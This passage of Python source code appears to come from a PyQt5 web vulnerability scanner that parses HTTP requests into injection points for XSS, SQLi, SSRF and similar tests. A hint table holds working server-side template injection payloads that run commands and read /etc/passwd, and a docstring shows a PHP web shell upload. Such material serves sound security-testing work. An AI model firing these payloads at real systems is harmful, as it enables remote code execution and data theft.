"""
Scanner Tab - Active vulnerability scanner for XSS and SQLi detection
Enhanced with Traffic Monitoring, Single Results/Logs view, and Advanced SQLi Detection
"""

import os
import json
import logging
import textwrap
import requests
import urllib.parse
import urllib3
import time
import re
import concurrent.futures
import threading
import html as html_module
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple, Set
from collections import defaultdict
from PyQt5.QtWidgets import (
    QDoubleSpinBox, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QTableWidget, QTableWidgetItem,
    QTextEdit, QPushButton, QLabel, QSplitter, QHeaderView, QMessageBox,
    QProgressBar, QComboBox, QMenu, QApplication, QTabWidget, QLineEdit, QDialog, QDialogButtonBox,
    QCheckBox, QGroupBox, QRadioButton, QFrame, QScrollArea, QSizePolicy
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl
from PyQt5.QtGui import QColor, QBrush, QFont, QTextCharFormat, QTextCursor, QDesktopServices

from modules.constants import (
    COLOR_ELEVATED_BG, COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_HIGH, COLOR_CRITICAL,
    COLOR_TEXT_MUTED, FONT_SIZE_NORMAL, HttpSyntaxHighlighter
)

# ---------------------------------------------------------------------------
# Scan mixin imports — each scan type lives in its own module under scans/
# ---------------------------------------------------------------------------
from scans import (
    XssScanMixin,
    SqliScanMixin,
    LfiScanMixin,
    CmdiScanMixin,
    IdorScanMixin,
    UploadScanMixin,
    SqliHelpersMixin,
    SsrfScanMixin,
    XxeScanMixin,
    NoSqliScanMixin,
    CorsScanMixin,
    OpenRedirectScanMixin,
    SstiScanMixin,
)
from modules.payloads_dialog import PayloadsDialog



# Disable SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Suppress Qt font-shaping warnings for scripts that have no OpenType support
# on this system (e.g. "OpenType support missing for Noto Sans Thaana,
# script 10").  These are triggered when binary HTTP response bodies contain
# byte sequences that happen to fall in non-Latin Unicode ranges — Qt's text
# shaper tries to find a suitable font and logs a harmless warning.
# ---------------------------------------------------------------------------
from PyQt5.QtCore import QtMsgType, qInstallMessageHandler as _qInstallMsgHandler

_FONT_WARNING_FRAGMENTS = (
    b"OpenType support missing",
    b"QFont::",
    b"Noto Sans",
)

def _qt_message_handler(msg_type, context, message):
    """Suppress known benign Qt font-shaping warnings; forward everything else."""
    if msg_type == QtMsgType.QtWarningMsg:
        msg_bytes = message.encode("utf-8", errors="replace")
        if any(frag in msg_bytes for frag in _FONT_WARNING_FRAGMENTS):
            return   # silently drop
    # Forward to default handler (prints to stderr)
    if msg_type == QtMsgType.QtCriticalMsg:
        logger.error(f"[Qt] {message}")
    elif msg_type == QtMsgType.QtWarningMsg:
        logger.warning(f"[Qt] {message}")
    elif msg_type == QtMsgType.QtInfoMsg:
        logger.info(f"[Qt] {message}")

_qInstallMsgHandler(_qt_message_handler)


def _sanitize_for_display(raw: bytes, max_bytes: int = 10_000) -> str:
    """
    Convert raw HTTP response bytes into a safe, readable string for display
    in a QTextEdit.

    Rules:
      • If content is valid UTF-8 / Latin-1 text → decode and return as-is
        (up to max_bytes chars).
      • If content is binary (contains null bytes or >30 % non-printable
        non-whitespace bytes) → show a hex dump of the first 512 bytes plus
        a summary line.  This prevents Qt from trying to shape arbitrary
        Unicode code-points from binary data, which generates the
        "OpenType support missing" warnings.
    """
    if not raw:
        return ""

    sample = raw[:2048]
    # Null bytes → definitely binary
    is_binary = b"\x00" in sample
    if not is_binary:
        non_print = sum(
            1 for b in sample
            if b < 0x09 or (0x0E <= b <= 0x1F) or b == 0x7F
        )
        is_binary = (non_print / max(len(sample), 1)) > 0.30

    if is_binary:
        hex_lines = []
        chunk = raw[:512]
        for i in range(0, len(chunk), 16):
            row = chunk[i:i + 16]
            hex_part  = " ".join(f"{b:02x}" for b in row)
            ascii_part = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in row)
            hex_lines.append(f"  {i:04x}  {hex_part:<48}  {ascii_part}")
        preview = "\n".join(hex_lines)
        return (
            f"[Binary content — {len(raw)} bytes total, "
            f"first 512 bytes shown as hex]\n\n"
            f"{preview}"
            + (f"\n  ... {len(raw) - 512} more bytes ..." if len(raw) > 512 else "")
        )

    # Text content — decode safely
    for enc in ("utf-8", "latin-1"):
        try:
            text = raw[:max_bytes].decode(enc)
            if len(raw) > max_bytes:
                text += f"\n\n[... {len(raw) - max_bytes} bytes truncated ...]"
            return text
        except (UnicodeDecodeError, ValueError):
            continue
    # Last resort
    return raw[:max_bytes].decode("ascii", errors="replace")


def _build_multipart_preview(files: dict, boundary: str = "----ScannerBoundaryPreview") -> str:
    """
    Build a human-readable multipart/form-data body string from a `files`
    dict (the same format passed to requests.post(files=...)).

    Pass the real boundary extracted from the PreparedRequest Content-Type
    header so the output matches exactly what was transmitted on the wire.

    Plain text fields : (None, value)
    File fields       : (filename, content, content_type)

    Example output:
        ------WebKitFormBoundaryXXX
        Content-Disposition: form-data; name="user"

        wiener
        ------WebKitFormBoundaryXXX
        Content-Disposition: form-data; name="avatar"; filename="shell.php"
        Content-Type: application/x-php

        <?php system($_GET['cmd']); ?>
        ------WebKitFormBoundaryXXX--
    """
    lines = []

    for field_name, field_val in files.items():
        lines.append(f"--{boundary}")

        if isinstance(field_val, tuple):
            if len(field_val) == 2:
                # Plain text field: (None, value)
                _, value = field_val
                lines.append(
                    f'Content-Disposition: form-data; name="{field_name}"'
                )
                lines.append("")
                lines.append(str(value) if value is not None else "")

            elif len(field_val) >= 3:
                # File field: (filename, content, content_type)
                filename, content, content_type = field_val[0], field_val[1], field_val[2]
                cd = f'Content-Disposition: form-data; name="{field_name}"'
                if filename:
                    cd += f'; filename="{filename}"'
                lines.append(cd)
                lines.append(f"Content-Type: {content_type}")
                lines.append("")

                # Content preview — binary → hex summary, text → show as-is
                if isinstance(content, bytes):
                    is_binary = (
                        b"\x00" in content[:256]
                        or sum(1 for b in content[:256]
                               if b < 0x09 or (0x0E <= b <= 0x1F)) / max(len(content[:256]), 1) > 0.2
                    )
                    if is_binary:
                        lines.append(
                            f"[binary — {len(content)} bytes  "
                            f"magic: {content[:8].hex()}]"
                        )
                    else:
                        text = content[:500].decode("utf-8", errors="replace")
                        if len(content) > 500:
                            text += f"\n[... {len(content) - 500} more bytes ...]"
                        lines.append(text)
                else:
                    lines.append(str(content)[:500])
        else:
            # Bare string value
            lines.append(
                f'Content-Disposition: form-data; name="{field_name}"'
            )
            lines.append("")
            lines.append(str(field_val)[:500])

    lines.append(f"--{boundary}--")
    return "\r\n".join(lines)

# ---------------------------------------------------------------------------
#  config — used by LFI wordlist loader
# ---------------------------------------------------------------------------


def _format_request(entry: 'TrafficEntry') -> str:
    """
    Render a TrafficEntry as a raw HTTP/1.1 request string — exactly the
    format Repeater expects, so users can copy-paste directly.

        POST /path HTTP/1.1
        Host: example.com
        cookie: session=abc...
        content-type: multipart/form-data; boundary=...

        --boundary
        Content-Disposition: form-data; name="avatar"; filename="shell.php"
        ...

    Rules:
      • First line  : METHOD /path?qs HTTP/1.1
      • Host header : always second, extracted from the URL
      • Skipped     : content-length, transfer-encoding (stale / recalculated)
      • Body        : appended after a blank line when present
    """
    parsed  = urllib.parse.urlparse(entry.url)
    path_qs = parsed.path or "/"
    if parsed.query:
        path_qs += "?" + parsed.query

    lines = [f"{entry.method} {path_qs} HTTP/1.1"]
    lines.append(f"Host: {parsed.netloc or parsed.hostname or ''}")

    SKIP = {"host", "content-length", "transfer-encoding"}
    for k, v in entry.request_headers.items():
        if k.lower() in SKIP:
            continue
        lines.append(f"{k}: {v}")

    lines.append("")                          # blank line between headers and body
    if entry.request_body:
        lines.append(entry.request_body)

    return "\n".join(lines)


def _format_response(entry: 'TrafficEntry') -> str:
    """
    Render a TrafficEntry response as raw HTTP — status line, headers, body.
    Shows response time and actual body size as synthetic headers so they're
    visible without clutter.
    """
    if not entry.status_code:
        return f"[ERROR] {entry.error or 'No response'}"

    parts = [f"HTTP/1.1 {entry.status_code}"]
    parts.append(f"X-Response-Time: {entry.response_time}s")
    parts.append(f"X-Content-Length: {entry.content_length} bytes")
    SKIP_RESP = {"content-length"}
    for k, v in entry.response_headers.items():
        if k.lower() in SKIP_RESP:
            continue
        parts.append(f"{k}: {v}")
    parts.append("")
    parts.append(entry.response_body[:8000])
    if len(entry.response_body) > 8000:
        parts.append("[… truncated …]")
    return "\n".join(parts)
# ── Persist last-opened project slug ─────────────────────────────────────────
_SETTINGS_FILE = os.path.join(
    os.path.expanduser("~"), ".config", "hunt-proxy", "settings.json"
)
# ─────────────────────────────────────────────────────────────────────────────
# SSTI exploitation hints shown in format_ssti_results
# ─────────────────────────────────────────────────────────────────────────────
_SSTI_EXPLOIT_HINTS: Dict[str, List[str]] = {
    "Jinja2": [
        "• RCE (unsandboxed): {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
        "• Class traversal:   {{ ''.__class__.__mro__[1].__subclasses__() }}",
        "• File read:         {{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}",
        "• Config dump:       {{ config }}",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Twig": [
        "• RCE:               {{['id']|map('system')|join}}",
        "• Filter abuse:      {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "• Globals:           {{_self}}  →  {{_self.env.getGlobals()}}",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Freemarker": [
        "• RCE:               <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "• Env list:          ${T(java.lang.System).getenv()}",
        "• File read:         <#assign fileContent>.../etc/passwd</#assign>",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Mako": [
        "• RCE:               <%\\nimport os\\nx=os.popen('id').read()\\n%>${x}",
        "• Module import:     ${__import__('os').popen('id').read()}",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "ERB": [
        "• RCE:               <%= `id` %>",
        "• File read:         <%= File.open('/etc/passwd').read %>",
        "• Dir list:          <%= Dir.entries('/') %>",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "EJS": [
        "• RCE:               <%= require('child_process').execSync('id').toString() %>",
        "• File read:         <%= require('fs').readFileSync('/etc/passwd','utf8') %>",
    ],
    "Velocity": [
        "• RCE:               $class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        "• Shell exec:        #set($e='')#set($e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection/exploiting",
    ],
    "Thymeleaf": [
        "• RCE (SpEL):        *{T(java.lang.Runtime).getRuntime().exec('id')}",
        "• Inline:            [[${T(java.lang.System).getenv()}]]",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Pebble": [
        "• RCE:               {% set cmd = 'id' %}{% for i in range(0, 1) %}{{ runtime.exec(cmd) }}{% endfor %}",
        "• getClass chain:    {{ ''.__class__.forName('java.lang.Runtime').getRuntime().exec('id') }}",
    ],
    "Smarty": [
        "• RCE:               {php}echo shell_exec('id');{/php}",
        "• Fetch:             {fetch file='/etc/passwd'}",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Handlebars": [
        "• Prototype pollution / RCE via constructor chain:",
        "  {{#with ''.split as |a|}}{{constructor.constructor 'return process.env' ''}}{{/with}}",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
    ],
    "Nunjucks": [
        "• RCE:               {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}",
    ],
    "Generic": [
        "• Confirm engine:    submit {{7*'7'}} → 7777777=Jinja2, 49=Twig",
        "• Try error probe:   ${{<%[%'\"}}%\\  to trigger and reveal engine stack-trace",
        "• Reference: https://portswigger.net/web-security/server-side-template-injection/exploiting",
    ],
}


def _load_lfi_wordlist() -> List[str]:
    """
    Load the LFI/Path-Traversal wordlist path from Hunt-Proxy.config,
    then read and return its payloads as a list of strings.
    Returns an empty list on any error so the caller can handle it gracefully.
    """
    wordlist_path = None
    try:
        with open(_SETTINGS_FILE, "r") as cfg:
            for line in cfg:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("lfi_wordlist="):
                    wordlist_path = line.split("=", 1)[1].strip().strip("\"'")
                    break
    except FileNotFoundError:
        logger.warning(f"Hunt-Proxy config not found: {_SETTINGS_FILE}")
        return []
    except Exception as e:
        logger.warning(f"Error reading Hunt-Proxy config: {e}")
        return []

    if not wordlist_path:
        logger.warning("lfi_wordlist key not found in Hunt-Proxy config")
        return []

    wordlist_path = os.path.expanduser(wordlist_path)

    try:
        with open(wordlist_path, "r") as wl:
            payloads = [
                line.strip()
                for line in wl
                if line.strip() and not line.strip().startswith("#")
            ]
        if not payloads:
            logger.warning(f"LFI wordlist file is empty: {wordlist_path}")
        return payloads
    except FileNotFoundError:
        logger.warning(f"LFI wordlist file not found: {wordlist_path}")
        return []
    except Exception as e:
        logger.warning(f"Error reading LFI wordlist ({wordlist_path}): {e}")
        return []


# ─────────────────────────────────────────────────────────────────────────────
# Injection-point selector infrastructure
# ─────────────────────────────────────────────────────────────────────────────

def _parse_request_components(request_data: Dict[str, Any]):
    """
    Parse a request dict into its constituent parts.
    Returns (full_url, method, headers, cookies, params, body_params, body_content).
    Shared by the dialog helpers below.
    """
    import json as _json

    full_url = request_data.get("url", "")
    request_text = request_data.get("request_text", "")
    lines = request_text.split('\n')

    method = "GET"
    if lines:
        fl = lines[0].strip().upper()
        for m in ("POST", "PUT", "PATCH", "DELETE"):
            if fl.startswith(m):
                method = m
                break

    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    body_content = ""
    seen_cookie = None

    for idx, line in enumerate(lines[1:], 1):
        stripped = line.strip()
        if stripped == "" or stripped == "\r\n":
            body_content = "\n".join(lines[idx + 1:])
            break
        if ':' in line:
            k, v = line.split(':', 1)
            k, v = k.strip(), v.strip()
            kl = k.lower()
            if kl not in {kk.lower() for kk in headers}:
                headers[k] = v
            if kl == 'cookie' and seen_cookie is None:
                seen_cookie = k
                # Step 1: split on '; ' (RFC standard separator)
                raw_pairs = re.split(r';\s*', v)
                # Step 2: some clients/proxies use ', ' instead of '; '.
                # Re-split any piece that looks like "value, NextName=..."
                # (only split when ', ' is followed by a word-char then '=')
                expanded = []
                for piece in raw_pairs:
                    sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                    expanded.extend(s.strip() for s in sub if s.strip())
                for pair in expanded:
                    if '=' in pair:
                        cn, cv = pair.split('=', 1)
                        cookies[cn.strip()] = cv.strip()

    parsed_url = urllib.parse.urlparse(full_url)
    params = urllib.parse.parse_qs(parsed_url.query)

    body_params: Dict[str, List] = {}
    if method in ("POST", "PUT", "PATCH") and body_content.strip():
        ct = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct = v.lower()
                break
        if "application/json" in ct:
            try:
                jdata = _json.loads(body_content.strip())
                if isinstance(jdata, dict):
                    body_params = {k: [str(v)] for k, v in jdata.items()}
            except Exception:
                pass
        elif "multipart/form-data" not in ct:
            try:
                body_params = urllib.parse.parse_qs(body_content.strip(), keep_blank_values=True)
            except Exception:
                pass
        else:
            # ── Multipart form-data: parse text fields AND file fields ────────
            try:
                # Get boundary from the ORIGINAL (non-lowercased) content-type header
                # because body content uses the original case boundary string.
                ct_orig = ""
                for k, v in headers.items():
                    if k.lower() == "content-type":
                        ct_orig = v
                        break
                bm = re.search(r'boundary=([^\s;\"\']+)', ct_orig, re.IGNORECASE)
                if bm:
                    boundary = bm.group(1).strip()
                    # body_content was built by split('\n')+join('\n') so \r\n
                    # line endings are gone. Split on --boundary (case-sensitive,
                    # as boundaries are case-sensitive per RFC 2046).
                    parts = re.split(r'--' + re.escape(boundary) + r'(?:--)?', body_content)
                    for part in parts:
                        part = part.lstrip('\r\n')
                        if not part or part.strip() == '--':
                            continue
                        # Part headers and body are separated by a blank line.
                        # After split('\n') normalisation we have \n\n.
                        # Also handle original \r\n\r\n just in case.
                        if '\r\n\r\n' in part:
                            part_headers, part_body = part.split('\r\n\r\n', 1)
                        elif '\n\n' in part:
                            part_headers, part_body = part.split('\n\n', 1)
                        else:
                            continue
                        part_body = part_body.rstrip('\r\n')

                        cd_match = re.search(
                            r'Content-Disposition:[^\n]*?;\s*name="([^"]+)"',
                            part_headers, re.IGNORECASE
                        )
                        if not cd_match:
                            continue
                        field_name = cd_match.group(1)

                        fn_match = re.search(
                            r'filename="([^"]*)"', part_headers, re.IGNORECASE
                        )
                        if fn_match:
                            filename = fn_match.group(1) or "file"
                            body_params[field_name] = [f"FILE:{filename}"]
                        else:
                            body_params[field_name] = [part_body]
            except Exception:
                pass

    return full_url, method, headers, cookies, params, body_params, body_content


def _parse_all_injection_points(request_data: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Return EVERY possible injection point as a flat list.
    Each dict has: id, name, type, value, category.
    `default` is intentionally NOT set here — it's computed per-scan by
    _compute_scan_defaults() and applied in InjectionPointSelectorDialog.

    Injection point categories detected:
      • URL Parameters  (query string ?foo=bar)
      • URL Path Segments  (/api/users/{id}/profile)
      • POST Body Parameters  (form-urlencoded)
      • JSON Body Fields  (application/json, first level)
      • Cookies  (Cookie: header, each name=value pair)
      • HTTP Headers  (all non-infra headers, e.g. User-Agent, Referer)
    """
    import json as _json

    full_url, method, headers, cookies, params, body_params, body_content = \
        _parse_request_components(request_data)

    points: List[Dict[str, Any]] = []

    # ── URL query parameters ──────────────────────────────────────────────────
    for name, vals in params.items():
        val = vals[0] if vals else ""
        points.append({
            "id": f"url:{name}", "name": name,
            "type": "URL Parameter", "value": val,
            "category": "</> URL Parameters",
        })

    # ── URL path segments ─────────────────────────────────────────────────────
    # Identify dynamic path segments: any non-trivial segment that could be
    # user-controlled — integers, UUIDs, hex IDs, slugs/tokens, version strings,
    # filenames with extensions (e.g. 38.jpg, report.pdf), or any short value
    # that isn't a pure lowercase word (API route component like "api", "v1", "users").
    parsed_url = urllib.parse.urlparse(full_url)
    path_segments = [s for s in parsed_url.path.split("/") if s]
    _ID_RE = re.compile(
        r'^(?:'
        r'\d+'                                               # pure integer  e.g. 42
        r'|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'  # UUID
        r'|[0-9a-fA-F]{24,}'                                # hex id (MongoDB ObjectId)
        r'|[A-Za-z0-9_-]{8,}'                               # long slug / token (8+ chars)
        r'|v\d+(?:\.\d+)*'                                  # version  e.g. v1, v2.0
        r'|[A-Za-z0-9_-]+\.[A-Za-z0-9]+'                    # filename with extension e.g. 38.jpg
        r'|\d+[A-Za-z_-]+|[A-Za-z_-]+\d+'                  # alphanumeric mix e.g. item42, 42item
        r')$'
    )
    # Segments that are clearly static API route components — skip them
    _STATIC_ROUTE_RE = re.compile(r'^[a-z][a-z-]*$')      # pure lowercase alpha words like "api", "users", "image"
    for seg_idx, seg in enumerate(path_segments):
        is_dynamic = _ID_RE.match(seg) and not _STATIC_ROUTE_RE.match(seg)
        if not is_dynamic:
            # Also include if it contains a dot (filename) or digits — even short ones
            is_dynamic = ('.' in seg) or seg.isdigit()
        if is_dynamic:
            seg_id = f"path:{seg_idx}:{seg}"
            points.append({
                "id": seg_id,
                "name": f"path[{seg_idx}]",
                "type": "URL Path Segment",
                "value": seg,
                "category": "⧄  URL Path Segments",
            })

    # ── POST / body parameters ────────────────────────────────────────────────
    if body_params:
        # Detect JSON body (stored in body_params with type indicator)
        ct = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct = v.lower()
                break
        is_json_body     = "application/json" in ct
        is_multipart     = "multipart/form-data" in ct
        cat  = "⧄ JSON Body Fields" if is_json_body else "🠶 POST Body Parameters"
        btype = "JSON Field"          if is_json_body else "POST Body"

        for name, vals in body_params.items():
            val = vals[0] if isinstance(vals, list) and vals else str(vals)
            # Multipart file fields are stored as "FILE:filename.ext" markers
            if is_multipart and isinstance(val, str) and val.startswith("FILE:"):
                points.append({
                    "id": f"body:{name}", "name": name,
                    "type": "File Upload Field", "value": val,
                    "category": "🠉 File Upload Fields",
                })
            else:
                points.append({
                    "id": f"body:{name}", "name": name,
                    "type": btype, "value": val,
                    "category": cat,
                })
    elif method in ("POST", "PUT", "PATCH") and body_content.strip():
        # Raw JSON body — flatten first level keys
        try:
            jdata = _json.loads(body_content.strip())
            if isinstance(jdata, dict):
                for name, val in jdata.items():
                    points.append({
                        "id": f"body:{name}", "name": name,
                        "type": "JSON Field", "value": str(val),
                        "category": "⧄ JSON Body Fields",
                    })
        except Exception:
            pass

    # ── Cookies ───────────────────────────────────────────────────────────────
    for name, val in cookies.items():
        points.append({
            "id": f"cookie:{name}", "name": name,
            "type": "Cookie", "value": val,
            "category": "🤀 Cookies",
        })

    # ── HTTP headers (skip infra / hop-by-hop headers) ────────────────────────
    SKIP_HDR = {"host", "content-length", "transfer-encoding", "connection",
                "accept-encoding", "cookie"}
    for name, val in headers.items():
        if name.lower() in SKIP_HDR:
            continue
        points.append({
            "id": f"header:{name}", "name": name,
            "type": "HTTP Header", "value": val,
            "category": "☰ HTTP Headers",
        })

    # ── Synthetic SSRF-specific headers ───────────────────────────────────────
    # These headers are classic SSRF/host-override attack vectors.  They are
    # shown in the injection-point dialog even when absent from the original
    # request — SSRF testing means ADDING them, not just modifying existing ones.
    # Deduplicate: skip any that are already present as regular headers above.
    _SYNTHETIC_SSRF_HEADERS = [
        "X-Forwarded-Host",
        "X-Forwarded-For",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Custom-IP-Authorization",
        "True-Client-IP",
        "CF-Connecting-IP",
        "Forwarded",
        "Referer",
    ]
    # Case-insensitive dedup: "referer" in original == "Referer" in our list.
    # Build a set of lowercased existing header names so we skip adding a
    # synthetic entry for any header already present under any casing.
    existing_header_names_lower = {
        p["name"].lower()
        for p in points
        if p.get("type") == "HTTP Header"
    }
    for hname in _SYNTHETIC_SSRF_HEADERS:
        if hname.lower() not in existing_header_names_lower:
            # Header absent from the original request — add as synthetic entry.
            # Empty value signals it will be injected fresh (not modified).
            points.append({
                "id":       f"header:{hname}",
                "name":     hname,
                "type":     "SSRF Header",
                "value":    "",
                "category": "🞋 SSRF-Specific Headers (injected)",
            })

    return points


# ── Per-scan default detection ────────────────────────────────────────────────

def _sqli_cookie_ok(name: str, value: str) -> bool:
    """Mirror of SqliHelpersMixin._should_test_cookie without the instance."""
    name_lower = name.lower()
    value_strip = value.strip()
    BLOCKED_EXACT = {
        'session', 'sessionid', 'session_id', 'phpsessid', 'jsessionid',
        'asp.net_sessionid', 'laravel_session', 'ci_session', 'rack.session',
        'django_session', 'beaker.session', 'symfony',
        'csrf_token', '_csrf', '_csrf_token', 'csrftoken', 'xsrf-token',
        'x-xsrf-token', '_token', 'authenticity_token', 'csrf',
        '_ga', '_gid', '_gat', '_gat_ua',
        '__utma', '__utmb', '__utmc', '__utmz', '__utmt',
        '_fbp', '_fbc', 'fr', '__cf_bm', 'cf_clearance', '__cflb', '__cfruid',
        '_dd_s', 'newrelic', 'cookieconsent', 'cookie_consent', 'gdpr',
        'cookie_notice_accepted', 'cookieyes', '__stripe_mid', '__stripe_sid',
        'incap_ses', 'visid_incap', 'ak_bmsc', 'bm_sz', '_abck', 'utag_main',
    }
    BLOCKED_PREFIXES = ('_ga_', '_gat_', '__utm', '__cf', 'amplitude_', 'mixpanel_', 'intercom-')
    if name_lower in BLOCKED_EXACT:
        return False
    if any(name_lower.startswith(p) for p in BLOCKED_PREFIXES):
        return False
    is_hex = bool(re.match(r'^[0-9a-fA-F]+$', value_strip))
    is_b64 = bool(re.match(r'^[A-Za-z0-9+/=_-]+$', value_strip))
    if len(value_strip) >= 32 and (is_hex or is_b64):
        return False
    return True


def _sqli_body_ok(name: str, value: str) -> bool:
    """Mirror of SqliHelpersMixin._should_test_body_param."""
    name_lower = name.lower()
    BLOCKED_EXACT = {
        'csrf_token', 'csrftoken', '_csrf', '_csrf_token', 'csrf',
        'csrfmiddlewaretoken', 'authenticity_token', 'xsrf_token', 'xsrf-token',
        '_token', 'form_token', 'form_key', '__requestverificationtoken',
        'x-csrf-token', 'x-xsrf-token', '_wpnonce', 'nonce', '_nonce',
        '__viewstate', '__viewstategenerator', '__eventvalidation', '__eventtarget',
        '__eventargument', '__previouspage', 'javax.faces.viewstate',
        'javax.faces.encodedurl', '__ncforminfo', '__utf8', '_method', 'utf8',
        'honeypot', 'hp', 'bot_check', 'h0n3yp0t', 'website', 'url', 'fax',
        'page', 'per_page', 'limit', 'offset', 'sort', 'sort_by', 'order',
        'order_by', 'direction', 'tab', 'step', 'next', 'prev',
        'submit', 'btn', 'button', 'action', 'commit',
        'g-recaptcha-response', 'h-captcha-response', 'captcha', 'captcha_code',
        'stripetoken', 'stripe_token', 'stripe_source', 'payment_method_nonce',
        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
        'fbclid', 'gclid', 'msclkid', 'ttclid',
        'return_url', 'redirect_url', 'next_url', 'redirect_to', 'return_to', 'continue',
    }
    BLOCKED_PREFIXES = ('csrf', 'xsrf', '__')
    if name_lower in BLOCKED_EXACT:
        return False
    if any(name_lower.startswith(p) for p in BLOCKED_PREFIXES):
        return False
    return True


def _compute_scan_defaults(scan_types: List[str], request_data: Dict[str, Any]) -> set:
    """
    Return the set of injection-point IDs (e.g. {"url:id", "cookie:TrackingId"})
    that the given scan types would test by default.
    This mirrors each scan's own parser logic so the dialog pre-checks exactly
    what the scan would actually test.
    """
    full_url, method, headers, cookies, params, body_params, body_content = \
        _parse_request_components(request_data)

    defaults: set = set()

    # Header sets by scan type
    SQLI_HEADERS  = {"User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"}
    SSRF_HEADERS  = {"Referer", "X-Forwarded-For", "X-Forwarded-Host",
                     "X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization",
                     "True-Client-IP", "CF-Connecting-IP", "Forwarded"}

    for scan in scan_types:
        if scan in ("XSS",):
            # XSS: all URL params + all POST/body params + dynamic path segments
            for name in params:
                defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")
            # Include dynamic URL path segments — must match _parse_all_injection_points exactly
            _ID_RE_DEF = re.compile(
                r'^(?:'
                r'\d+'
                r'|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
                r'|[0-9a-fA-F]{24,}'
                r'|[A-Za-z0-9_-]{8,}'
                r'|v\d+(?:\.\d+)*'
                r'|[A-Za-z0-9_-]+\.[A-Za-z0-9]+'
                r'|\d+[A-Za-z_-]+|[A-Za-z_-]+\d+'
                r')$'
            )
            _STATIC_RE_DEF = re.compile(r'^[a-z][a-z0-9-]*$')
            _parsed_url = urllib.parse.urlparse(full_url)
            for seg_i, seg in enumerate(_parsed_url.path.split("/")):
                if not seg:
                    continue
                is_dyn = _ID_RE_DEF.match(seg) and not _STATIC_RE_DEF.match(seg)
                if not is_dyn:
                    is_dyn = ('.' in seg) or seg.isdigit()
                if is_dyn:
                    defaults.add(f"path:{seg_i}:{seg}")

        elif scan in ("SQLi",):
            # SQLi: all URL params + cookies that pass the filter + body params
            # that pass the filter + specific dangerous headers
            for name in params:
                defaults.add(f"url:{name}")
            for name, val in cookies.items():
                if _sqli_cookie_ok(name, val):
                    defaults.add(f"cookie:{name}")
            for name, vals in body_params.items():
                val = vals[0] if isinstance(vals, list) and vals else str(vals)
                if _sqli_body_ok(name, val):
                    defaults.add(f"body:{name}")
            for hname in SQLI_HEADERS:
                if any(k == hname for k in headers):
                    defaults.add(f"header:{hname}")

        elif scan in ("LFI",):
            # LFI: all URL params (or bare path fuzz when no params) + body params when present
            for name in params:
                defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")
            # Path segments, cookies, headers are opt-in only — not pre-selected

        elif scan in ("CMDi",):
            # CMDi: all URL params + body params that pass body filter
            # Path segments, cookies, headers are opt-in only
            for name in params:
                defaults.add(f"url:{name}")
            for name, vals in body_params.items():
                val = vals[0] if isinstance(vals, list) and vals else str(vals)
                if _sqli_body_ok(name, val):
                    defaults.add(f"body:{name}")

        elif scan in ("IDOR",):
            # IDOR: URL params + body params (filtered) + cookies (filtered)
            for name in params:
                defaults.add(f"url:{name}")
            for name, vals in body_params.items():
                val = vals[0] if isinstance(vals, list) and vals else str(vals)
                if _sqli_body_ok(name, val):
                    defaults.add(f"body:{name}")
            for name, val in cookies.items():
                if _sqli_cookie_ok(name, val):
                    defaults.add(f"cookie:{name}")

        elif scan in ("SSRF",):
            # SSRF: URL params that look like URLs/hosts + body params same
            # + SSRF-specific headers (always pre-checked, even if absent from
            # the original request — they are shown as synthetic dialog entries)
            _SSRF_HIGH = {
                "url", "uri", "link", "src", "source", "dest", "destination",
                "redirect", "redirect_uri", "redirect_url", "return", "return_url",
                "next", "path", "target", "img", "image", "file", "document",
                "load", "fetch", "request", "proxy", "callback", "continue",
                "forward", "goto", "location", "host", "endpoint", "remote",
                "data", "server", "page", "to", "out", "view",
            }
            def _ssrf_tier(n, v):
                nl = n.lower().replace("-","").replace("_","")
                if nl in _SSRF_HIGH: return True
                for sub in ("url", "uri", "link", "src", "dest", "redirect",
                            "host", "proxy", "fetch", "remote"):
                    if sub in nl: return True
                if re.match(r'https?://', v): return True
